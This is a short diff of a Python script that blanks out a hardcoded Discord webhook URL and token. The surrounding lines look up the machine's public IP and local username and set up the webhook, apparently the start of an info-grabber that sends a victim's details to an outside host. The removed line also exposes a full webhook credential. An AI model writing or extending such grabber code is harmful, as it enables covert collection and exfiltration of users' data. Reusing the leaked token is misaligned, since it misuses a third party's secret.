@@ -32,7 +32,7 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/852149579432722452/tEbMyCTEXlSaAHPbCSuX_09zqaZEhdyCXZtZq60Bf5V6fHoprZFbFGCRpT3l1xby-6Fb" #WEBHOOK URL GOES INSIDE THE QOUTES!
+WEBHOOK_URL = "" #WEBHOOK URL GOES INSIDE THE QOUTES!
 webhook = Webhook.from_url(WEBHOOK_URL, adapter=RequestsWebhookAdapter()) 
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
